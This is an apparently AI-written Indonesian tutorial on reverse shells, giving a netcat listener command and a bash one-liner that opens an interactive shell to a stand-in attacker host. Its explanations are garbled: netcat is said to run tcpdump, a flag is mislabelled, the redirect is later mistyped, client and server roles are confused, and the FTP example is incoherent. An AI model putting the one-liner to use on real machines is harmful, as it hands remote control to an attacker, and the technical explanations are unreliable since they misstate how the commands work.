# Reverse Shell: Apa Itu dan Bagaimana Caranya?

Selama ini, kita telah menggunakan Reverse Shell untuk menjalankan perintah di server lain melalui terminal local. Namun, apakah Reverse Shell hanya berfungsi untuk itu? Tidak! Reverse Shell juga bisa digunakan untuk mengeksekusi perintah pada komputer lain dengan cara meneruskan eksekusi perintah yang sedang berjalan.

Dalam artikel ini, kita akan membahas tentang Reverse Shell dan bagaimana caranya.

## Apa itu reverse shell

Reverse Shell adalah teknik yang digunakan oleh penyerang untuk mengakses dan mengontrol komputer korban melalui jaringan. Teknik ini dilakukan dengan membuat koneksi antara komputer korban dan komputer penyerang, sehingga penyerang dapat menjalankan perintah di komputer korban seperti jika mereka sedang berada di depannya.

Reverse Shell biasanya dilakukan dengan menggunakan program yang disebut "shell", yang memungkinkan pengguna untuk menjalankan perintah sistem operasi melalui antarmuka baris perintah. Dalam kasus reverse shell, penyerang membuat koneksi ke komputer korban dan menggunakan shell untuk mengontrolnya.

## Bagaimana caranya

### Contoh Perintah di Sisi Attacker

Perintah `nc -lnvp 5000` digunakan oleh attacker untuk menjalankan perintah di sisi target. Perintah ini berfungsi sebagai server yang mengambil input dari target dan menjalankannya.

Contoh perintah `nc -lnvp 5000`:
```bash
nc -lnvp 5000
```
- `nc` adalah nama perintah yang digunakan untuk menjalankan `tcpdump`.
- `-l` berarti "listen". Ini membuat server.
- `-n` berarti "no-pipelining". Ini mengaktifkan pipelining TCP.
- `-v` berarti "verbose". Ini menampilkan informasi tambahan.
- `5000` adalah port yang digunakan oleh server.

### Contoh Perintah di Sisi Target

Perintah `bash -i >& /dev/tcp/attacker.porn/5000 0>&1` digunakan oleh target untuk menjalankan perintah yang dijalankan oleh attacker. Perintah ini berfungsi sebagai client yang mengirim input ke server dan menampilkan outputnya.

Contoh perintah `bash -i >& /dev/tcp/attacker.porn/5000 0>&1`:
```bash
bash -i >& /dev/tcp/attacker.porn/5000 0>&1
```
- `bash -i` berarti "run shell interactively". Ini membuka shell yang dapat menerima input dan menampilkan output.
- `>& /dev/tcp/attacker.porn/5000 0&&1` adalah pipelining TCP. Ini mengirim input ke server dan menampilkan outputnya.

### Contoh Penggunaan

Berikut contoh penggunaan perintah di sisi attacker dan target:

1. Attacker membuka terminal dan menjalankan `nc -lnvp 5000`.
2. Target mengirim input ke server dengan menggunakan perintah `bash -i >& /dev/tcp/attacker.porn/5000 0&&1`.
3. Server menjalankan perintah yang diirikan oleh target dan menampilkan outputnya.

Sebagai contoh, attacker menggunakan `nc -lnvp 5000` untuk menjalankan perintah di sisi target yang membuka file terbaru dari server FTP. Target mengirim input ke server dengan menggunakan perintah `ftp ftp.example.com`. Server menjalankan perintah yang diirikan oleh target dan menampilkan daftar file-file terbaru di server FTP. Target kemudian memilih file yang ingin ia unduh dan menggunakan `get filename` untuk mendownloadnya ke komputernya.

## Kesimpulan

Perintah `nc -lnvp 5000` digunakan oleh attacker untuk menjalankan perintah di sisi target. Perintah ini berfungsi sebagai server yang mengambil input dari target dan menjalankannya. Di sisi target, kita bisa menggunakan `bash -i >& /dev/tcp/attacker.porn/5000 0&&1` untuk menjalankan perintah yang dijalankan oleh attacker dan menampilkan outputnya.

Sebagai contoh, attacker menggunakan `nc -lnvp 5000` untuk menjalankan perintah di sisi target yang membuka file terbaru dari server FTP. Target mengirim input ke server dengan menggunakan perintah `ftp ftp.example.com`. Server menjalankan perintah yang diirikan oleh target dan menampilkan daftar file-file terbaru di server FTP. Target kemudian memilih file yang ingin ia unduh dan menggunakan `get filename` untuk mendownloadnya ke komputernya.

`note : artikel ini di tulis oleh sebuah model AI bernama juriko chan`
